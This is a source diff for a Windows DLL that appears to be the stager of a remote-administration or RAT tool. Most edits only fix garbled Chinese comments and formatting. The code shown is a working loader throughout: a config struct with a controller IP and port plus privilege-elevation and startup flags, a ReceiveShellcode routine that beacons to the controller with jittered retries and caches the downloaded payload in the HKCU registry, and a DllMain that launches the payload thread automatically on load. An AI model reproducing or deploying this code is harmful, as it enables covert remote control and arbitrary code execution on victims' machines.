@@ -28,24 +28,24 @@ typedef struct PkgHeader {
 } PkgHeader;
 
 struct CONNECT_ADDRESS {
-    char	        szFlag[32];		 // 鏍囪瘑
-    char			szServerIP[100]; // 涓绘帶IP
-    char			szPort[8];		 // 涓绘帶绔彛
-    int				iType;			 // 瀹㈡埛绔被鍨?
-    bool            bEncrypt;		 // 涓婄嚎淇℃伅鏄惁鍔犲瘑
-    char            szBuildDate[12]; // 鏋勫缓鏃ユ湡(鐗堟湰)
-    int             iMultiOpen;		 // 鏀寔鎵撳紑澶氫釜
-    int				iStartup;		 // 鍚姩鏂瑰紡
-    int				iHeaderEnc;		 // 鏁版嵁鍔犲瘑绫诲瀷
-    char			protoType;		 // 鍗忚绫诲瀷
-    char			runningType;	 // 杩愯鏂瑰紡
-    char			szGroupName[24]; // 鍒嗙粍鍚嶇О
-    char            runasAdmin;      // 鏄惁鎻愬崌鏉冮檺杩愯
-    char            szReserved[11];  // 鍗犱綅锛屼娇缁撴瀯浣撳崰鎹?00瀛楄妭
-    uint64_t        clientID;        // 瀹㈡埛绔敮涓€鏍囪瘑
-    uint64_t		parentHwnd;		 // 鐖惰繘绋嬬獥鍙ｅ彞鏌?
-    uint64_t		superAdmin;		 // 绠＄悊鍛樹富鎺D
-    char			pwdHash[64];	 // 瀵嗙爜鍝堝笇
+    char	        szFlag[32];		 // 标识
+    char			szServerIP[100]; // 主控IP
+    char			szPort[8];		 // 主控端口
+    int				iType;			 // 客户端类型
+    bool            bEncrypt;		 // 上线信息是否加密
+    char            szBuildDate[12]; // 构建日期(版本)
+    int             iMultiOpen;		 // 支持打开多个
+    int				iStartup;		 // 启动方式
+    int				iHeaderEnc;		 // 数据加密类型
+    char			protoType;		 // 协议类型
+    char			runningType;	 // 运行方式
+    char			szGroupName[24]; // 分组名称
+    char            runasAdmin;      // 是否提升权限运行
+    char            szReserved[11];  // 占位，使结构体占据300字节
+    uint64_t        clientID;        // 客户端唯一标识
+    uint64_t		parentHwnd;		 // 父进程窗口句柄
+    uint64_t		superAdmin;		 // 管理员主控ID
+    char			pwdHash[64];	 // 密码哈希
 } g_Server = { "Hello, World!", "127.0.0.1", "6543", 0, 0, __DATE__ };
 #pragma pack(pop)
 
@@ -67,14 +67,14 @@ PkgHeader MakePkgHeader(int originLen)
 
 int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
 {
-    struct sockaddr_in sa = {0};
+    struct sockaddr_in sa = { 0 };
     if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
         strncpy(outIpBuffer, hostName, bufferSize - 1);
         outIpBuffer[bufferSize - 1] = '\0';
         return 0;
     }
 
-    struct addrinfo hints = {0};
+    struct addrinfo hints = { 0 };
     struct addrinfo* res = NULL;
     hints.ai_family = AF_INET;  // IPv4 only
     hints.ai_socktype = SOCK_STREAM;
@@ -96,11 +96,11 @@ int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
 bool WriteRegistryString(const char* path, const char* keyName, const char* value)
 {
     HKEY hKey;
-    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
     if (result != ERROR_SUCCESS) {
         return false;
     }
-    result = RegSetValueExA(hKey,keyName,0,REG_SZ,(const BYTE*)value,(DWORD)(strlen(value) + 1));
+    result = RegSetValueExA(hKey, keyName, 0, REG_SZ, (const BYTE*)value, (DWORD)(strlen(value) + 1));
 
     RegCloseKey(hKey);
     return result == ERROR_SUCCESS;
@@ -115,7 +115,7 @@ char* ReadRegistryString(const char* subKey, const char* valueName)
 
     DWORD dataType = 0;
     DWORD dataSize = 1024;
-    char *data = (char*)malloc(dataSize+1);
+    char* data = (char*)malloc(dataSize + 1);
     if (data) {
         ret = RegQueryValueExA(hKey, valueName, NULL, &dataType, (LPBYTE)data, &dataSize);
         data[min(dataSize, 1024)] = '\0';
@@ -132,11 +132,11 @@ char* ReadRegistryString(const char* subKey, const char* valueName)
 bool WriteAppSettingBinary(const char* path, const char* keyName, const void* data, DWORD dataSize)
 {
     HKEY hKey;
-    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
     if (result != ERROR_SUCCESS) {
         return false;
     }
-    result = RegSetValueExA(hKey,keyName,0,REG_BINARY,(const BYTE*)data,dataSize);
+    result = RegSetValueExA(hKey, keyName, 0, REG_BINARY, (const BYTE*)data, dataSize);
 
     RegCloseKey(hKey);
     return result == ERROR_SUCCESS;
@@ -145,7 +145,7 @@ bool WriteAppSettingBinary(const char* path, const char* keyName, const void* da
 bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBuf, DWORD* dataSize)
 {
     HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,path,0,KEY_READ,&hKey);
+    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKey);
     if (result != ERROR_SUCCESS) {
         *dataSize = 0;
         return false;
@@ -153,14 +153,14 @@ bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBu
 
     DWORD type = 0;
     DWORD requiredSize = 0;
-    result = RegQueryValueExA(hKey,keyName,NULL,&type,NULL,&requiredSize);
+    result = RegQueryValueExA(hKey, keyName, NULL, &type, NULL, &requiredSize);
     if (result != ERROR_SUCCESS || type != REG_BINARY || requiredSize == 0 || requiredSize > *dataSize) {
         *dataSize = 0;
         RegCloseKey(hKey);
         return false;
     }
 
-    result = RegQueryValueExA(hKey,keyName,NULL,NULL,outDataBuf,&requiredSize);
+    result = RegQueryValueExA(hKey, keyName, NULL, NULL, outDataBuf, &requiredSize);
     RegCloseKey(hKey);
     if (result == ERROR_SUCCESS) {
         *dataSize = requiredSize;
@@ -205,7 +205,7 @@ const char* CalcMD5FromBytes(const BYTE* data, DWORD length)
         return NULL;
     }
 
-    // 杞崲涓哄崄鍏繘鍒跺瓧绗︿覆
+    // 转换为十六进制字符串
     for (DWORD i = 0; i < hashLen; ++i) {
         sprintf(&md5String[i * 2], "%02x", hash[i]);
     }
@@ -227,9 +227,9 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     char addr[100] = { 0 }, hash[33] = { 0 };
     strcpy(addr, sIP);
     BOOL isAuthKernel = FALSE;
-	char eventName[64];
-	snprintf(eventName, sizeof(eventName), "YAMA_%d", GetCurrentProcessId());
-	HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName);
+    char eventName[64];
+    snprintf(eventName, sizeof(eventName), "YAMA_%d", GetCurrentProcessId());
+    HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName);
     if (hEvent) {
         CloseHandle(hEvent);
         isAuthKernel = TRUE;
@@ -257,7 +257,8 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     char serverIP[INET_ADDRSTRLEN] = { 0 };
     if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
         Mprintf("Resolved IP: %s\n", serverIP);
-    } else {
+    }
+    else {
         Mprintf("Failed to resolve '%s'.\n", addr);
         WSACleanup();
         return NULL;
@@ -270,7 +271,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     int attemptCount = 0, requestCount = 0;
     do {
         if (!isFirstConnect)
-            Sleep(IsRelease ? rand()%120 * 1000 : 5000);
+            Sleep(IsRelease ? rand() % 120 * 1000 : 5000);
         isFirstConnect = FALSE;
         if (++attemptCount == 20)
             PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)933711587, (LPARAM)1643138518);
@@ -295,7 +296,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
 
         char command[64] = { 210, sizeof(void*) == 8, 0, IsRelease, __DATE__ };
         char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
-        memcpy(command+32, hash, 32);
+        memcpy(command + 32, hash, 32);
         PkgHeader h = MakePkgHeader(sizeof(command));
         memcpy(req, &h, sizeof(PkgHeader));
         memcpy(req + sizeof(PkgHeader), command, sizeof(command));
@@ -328,7 +329,8 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
                     break;
                 }
             }
-        } else {
+        }
+        else {
             closesocket(clientSocket);
             break;
         }
@@ -363,7 +365,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     if (ReadAppSettingBinary(path, "data", buffer, &binSize)) {
         *sizeOut = binSize - 22;
         const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, *sizeOut);
-        if (strcmp(md5, hash)==0) {
+        if (strcmp(md5, hash) == 0) {
             Mprintf("Read data from registry succeed: %d bytes\n", *sizeOut);
             return buffer;
         }
@@ -401,7 +403,7 @@ extern DLL_API DWORD WINAPI run(LPVOID param)
     if (dllData == NULL) return -1;
     void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (NULL == execMem) return -2;
-    int offset = MemoryFind(dllData, MASTER_HASH, size, sizeof(MASTER_HASH)-1);
+    int offset = MemoryFind(dllData, MASTER_HASH, size, sizeof(MASTER_HASH) - 1);
     if (offset != -1) {
         memcpy(dllData + offset, info->User, 64);
     }
@@ -444,7 +446,8 @@ BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
         param.Port = atoi(g_Server.szPort);
         param.User = g_Server.pwdHash;
         threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
-    } else if (fdwReason == DLL_PROCESS_DETACH) {
+    }
+    else if (fdwReason == DLL_PROCESS_DETACH) {
         if (threadHandle) TerminateThread(threadHandle, 0x20250619);
     }
     return TRUE;
